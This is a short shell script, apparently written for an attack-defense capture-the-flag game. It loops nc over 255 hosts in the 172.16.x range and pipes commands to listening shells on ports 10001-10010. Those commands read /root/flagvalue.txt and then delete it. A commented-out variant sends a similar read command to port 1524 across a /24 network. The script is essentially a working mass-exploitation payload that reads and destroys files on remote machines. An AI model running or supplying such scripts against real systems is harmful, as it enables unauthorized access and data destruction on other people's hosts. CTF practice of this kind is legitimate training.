for i in $(seq 255)
do
p=[10001-10010,200001-200010,300001-300010]
s="172.16.$i.250"
echo -e "\n\n$s\n\n"
echo 'cat /root/flagvalue.txt&&rm /root/flagvalue.txt&&exit'| nc  $s 10001-10010 & { sleep 0.001; kill $! &} 
done
 



#for i in $(seq 255);do echo 'cat /root/flag.txt&&exit' | nc -nvv  172.16.123.$i 1524 & { sleep 0.04;kill $! &};done
